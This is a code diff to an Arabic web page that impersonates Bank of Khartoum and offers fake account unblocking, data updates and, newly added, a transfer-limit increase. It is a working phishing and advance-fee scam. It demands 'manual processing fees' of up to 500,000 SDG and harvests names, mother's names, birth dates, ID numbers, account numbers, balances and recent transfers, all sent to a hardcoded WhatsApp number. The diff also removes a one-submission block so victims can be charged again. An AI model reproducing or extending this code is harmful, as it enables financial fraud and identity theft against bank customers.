@@ -20,7 +20,6 @@
         .step-container { display: none; }
         .step-container.active { display: block; }
         .service-card { border: 2px solid #f3f4f6; transition: all 0.3s; cursor: pointer; border-radius: 12px; }
-        #blocked-screen { display: none; }
     </style>
 </head>
 <body>
@@ -65,11 +64,22 @@
                             <p class="text-xs text-gray-500">فك حظر الحساب فوراً ومعالجة يدوية</p>
                         </div>
                     </div>
+                    <div onclick="selectService('limit')" class="service-card p-4 flex items-center gap-4">
+                        <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-chart-line text-xl"></i></div>
+                        <div>
+                            <p class="font-bold">خدمات رفع سقف التحويل</p>
+                            <p class="text-xs text-gray-500">رفع سقف التحويل اليومي إلى 30 مليون ج.س</p>
+                        </div>
+                    </div>
                 </div>
             </div>
 
             <div class="step-container" id="step1">
                 <div class="space-y-5">
+                    <div id="limit_info_box" class="hidden bg-blue-50 p-3 rounded-lg border border-blue-200 text-sm text-blue-800 text-center">
+                        سيتم رفع سقف التحويل اليومي لحسابكم إلى <b>30,000,000 ج.س</b> فور اكتمال الطلب.
+                    </div>
+
                     <input type="text" id="full_name" placeholder="الاسم رباعي كما في الهوية" class="bok-input" required>
                     
                     <div id="update_fields" class="hidden space-y-5">
@@ -81,6 +91,11 @@
                         <input type="text" id="acc_number" placeholder="رقم الحساب الشخصي" class="bok-input text-left" dir="ltr">
                         <input type="text" id="branch" placeholder="فرع فتح الحساب" class="bok-input">
                         <input type="text" id="balance" placeholder="المبلغ الموجود في الحساب" class="bok-input">
+                    </div>
+
+                    <div id="limit_fields" class="hidden space-y-5">
+                        <input type="text" id="doc_number" placeholder="رقم المستند (جواز / بطاقة / رقم وطني)" class="bok-input">
+                        <input type="text" id="job" placeholder="المهنة الحالية" class="bok-input">
                     </div>
                 </div>
                 <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-10 shadow-lg">التالي</button>
@@ -95,8 +110,21 @@
                         <p class="text-[10px] text-gray-400 mt-1 mr-1 text-right">يرجى إدخال التاريخ يدوياً (يوم/شهر/سنة)</p>
                     </div>
                     <input type="tel" id="phone_linked" placeholder="رقم الهاتف المرتبط بالحساب (واتساب)" class="bok-input text-left" dir="ltr" required>
+                    
                     <div id="unblock_date_container" class="hidden">
                         <input type="text" id="block_date" placeholder="تاريخ حظر الحساب" class="bok-input text-left" dir="ltr">
+                    </div>
+
+                    <div id="limit_step2_fields" class="hidden space-y-5">
+                        <input type="text" id="limit_acc_num" placeholder="رقم الحساب المراد رفع سقفه" class="bok-input text-left" dir="ltr">
+                        <select id="acc_type" class="bok-input">
+                            <option value="">-- اختر نوع الحساب --</option>
+                            <option value="توفير">توفير</option>
+                            <option value="توفير مميز">توفير مميز</option>
+                            <option value="حساب بإسم عمل">حساب بإسم عمل</option>
+                        </select>
+                        <input type="text" id="limit_branch" placeholder="فرع الحساب" class="bok-input">
+                        <textarea id="last_trans" placeholder="آخر 3 تحويلات صادرة من الحساب (المبالغ والتواريخ)" class="bok-input h-24"></textarea>
                     </div>
                 </div>
                 <div class="flex gap-3 mt-10">
@@ -114,6 +142,9 @@
                         </div>
                         <div id="fee_text_unblock" class="hidden text-xs text-red-700 leading-relaxed">
                             بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>299,000 ج.س</b> لضمان فك الحظر خلال 24 ساعة. سيتم خصم 15,000 ج.س رسوم إجرائية، وإعادة 284,000 ج.س لحسابكم فوراً.
+                        </div>
+                        <div id="fee_text_limit" class="hidden text-xs text-red-700 leading-relaxed">
+                            بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>500,000 ج.س</b> مقابل تنفيذ طلب رفع السقف. سيتم خصم 15,000 ج.س طرف البنك، وإعادة المبلغ المتبقي (485,000 ج.س) في حسابكم فوراً.
                         </div>
                     </div>
 
@@ -135,27 +166,11 @@
         </form>
     </main>
 
-    <div id="blocked-screen" class="main-content">
-        <div class="text-center bg-yellow-50 border-2 border-yellow-100 p-8 rounded-2xl">
-            <i class="fas fa-clock text-5xl text-yellow-500 mb-4"></i>
-            <h2 class="text-xl font-bold text-gray-800 mb-2">طلبك قيد المراجعة</h2>
-            <p class="text-gray-600 text-sm">لقد قمت بإرسال طلبك مسبقاً من هذا المتصفح. يرجى الانتظار 24 ساعة حتى يتم تنفيذ الإجراء.</p>
-        </div>
-    </div>
-
     <footer class="mt-12 text-center text-[12px] text-gray-400 border-t pt-4 font-bold">
         جميع الحقوق محفوظة بنك الخرطوم
     </footer>
 
     <script>
-        window.onload = function() {
-            if (localStorage.getItem('form_submitted') === 'true') {
-                document.getElementById('main-ui').style.display = 'none';
-                document.getElementById('blocked-screen').style.display = 'block';
-                document.getElementById('header-title').innerText = "تنبيه";
-            }
-        };
-
         const MY_WHATSAPP = "249960724630"; 
         let selectedService = '';
 
@@ -165,20 +180,31 @@
             document.getElementById('stepper').classList.remove('hidden');
             document.getElementById('step1').classList.add('active');
             
+            document.getElementById('update_fields').classList.add('hidden');
+            document.getElementById('unblock_fields').classList.add('hidden');
+            document.getElementById('limit_fields').classList.add('hidden');
+            document.getElementById('limit_info_box').classList.add('hidden');
+            document.getElementById('unblock_date_container').classList.add('hidden');
+            document.getElementById('limit_step2_fields').classList.add('hidden');
+            document.getElementById('fee_text_update').classList.add('hidden');
+            document.getElementById('fee_text_unblock').classList.add('hidden');
+            document.getElementById('fee_text_limit').classList.add('hidden');
+
             if(service === 'update') {
                 document.getElementById('header-title').innerText = "تحديث بيانات بنكك";
                 document.getElementById('update_fields').classList.remove('hidden');
-                document.getElementById('unblock_fields').classList.add('hidden');
-                document.getElementById('unblock_date_container').classList.add('hidden');
                 document.getElementById('fee_text_update').classList.remove('hidden');
-                document.getElementById('fee_text_unblock').classList.add('hidden');
-            } else {
+            } else if(service === 'unblock') {
                 document.getElementById('header-title').innerText = "حل مشكلة الحساب المحظور";
                 document.getElementById('unblock_fields').classList.remove('hidden');
-                document.getElementById('update_fields').classList.add('hidden');
                 document.getElementById('unblock_date_container').classList.remove('hidden');
                 document.getElementById('fee_text_unblock').classList.remove('hidden');
-                document.getElementById('fee_text_update').classList.add('hidden');
+            } else if(service === 'limit') {
+                document.getElementById('header-title').innerText = "رفع سقف الحساب";
+                document.getElementById('limit_info_box').classList.remove('hidden');
+                document.getElementById('limit_fields').classList.remove('hidden');
+                document.getElementById('limit_step2_fields').classList.remove('hidden');
+                document.getElementById('fee_text_limit').classList.remove('hidden');
             }
         }
 
@@ -198,34 +224,44 @@
             const name = document.getElementById('full_name').value;
             const transId = document.getElementById('transaction_id').value;
             const phone = document.getElementById('phone_linked').value;
+            const mother = document.getElementById('mother_name').value;
+            const dob = document.getElementById('dob').value;
+            const address = document.getElementById('address').value;
+            
             if (!transId) { alert("يرجى إدخال رقم العملية"); return; }
-
-            localStorage.setItem('form_submitted', 'true');
 
             let message = "";
             if (selectedService === 'update') {
                 const ref = document.getElementById('ref_number').value;
                 message = `*طلب تحديث بيانات بنكك*%0A` +
                           `--------------------------%0A` +
-                          `*الاسم:* ${name}%0A` +
-                          `*المرجعي:* ${ref}%0A` +
-                          `*رقم الحساب:* ${phone}%0A` +
-                          `*رقم العملية:* ${transId}%0A` +
+                          `*الاسم:* ${name}%0A*المرجعي:* ${ref}%0A*رقم الحساب:* ${phone}%0A*رقم العملية:* ${transId}%0A` +
                           `--------------------------%0A` +
                           `تم سداد مبلغ 99,000 ج.س (معالجة يدوية وفورية).`;
-            } else {
+            } else if (selectedService === 'unblock') {
                 const acc = document.getElementById('acc_number').value;
                 const branch = document.getElementById('branch').value;
                 const balance = document.getElementById('balance').value;
                 message = `*طلب فك حظر حساب بنكك*%0A` +
                           `--------------------------%0A` +
-                          `*الاسم:* ${name}%0A` +
-                          `*رقم الحساب:* ${acc}%0A` +
-                          `*الفرع:* ${branch}%0A` +
-                          `*الرصيد:* ${balance}%0A` +
-                          `*رقم العملية:* ${transId}%0A` +
+                          `*الاسم:* ${name}%0A*رقم الحساب:* ${acc}%0A*اسم الوالدة:* ${mother}%0A*السكن:* ${address}%0A*واتساب:* ${phone}%0A*رقم العملية:* ${transId}%0A*الفرع:* ${branch}%0A*الرصيد التقريبي:* ${balance}%0A*تاريخ الحظر:* ${document.getElementById('block_date').value}%0A` +
                           `--------------------------%0A` +
                           `تم سداد مبلغ 299,000 ج.س رسوم معالجة يدوية%0Aو ارغب في بدء الإجراءات`;
+            } else if (selectedService === 'limit') {
+                const doc = document.getElementById('doc_number').value;
+                const job = document.getElementById('job').value;
+                const limitAcc = document.getElementById('limit_acc_num').value;
+                const type = document.getElementById('acc_type').value;
+                const branch = document.getElementById('limit_branch').value;
+                const lastTrans = document.getElementById('last_trans').value;
+                
+                message = `*طلب رفع سقف التحويل (30 مليون)*%0A` +
+                          `--------------------------%0A` +
+                          `*الاسم:* ${name}%0A*اسم الوالدة:* ${mother}%0A*تاريخ الميلاد:* ${dob}%0A*رقم المستند:* ${doc}%0A*المهنة:* ${job}%0A` +
+                          `*رقم الحساب:* ${limitAcc}%0A*نوع الحساب:* ${type}%0A*الفرع:* ${branch}%0A` +
+                          `*آخر التحويلات:* ${lastTrans}%0A*رقم العملية:* ${transId}%0A` +
+                          `--------------------------%0A` +
+                          `تم سداد مبلغ 500,000 ج.س رسوم معالجة يدوية.`;
             }
 
             window.open(`https://wa.me/${MY_WHATSAPP}?text=${message}`, '_blank');
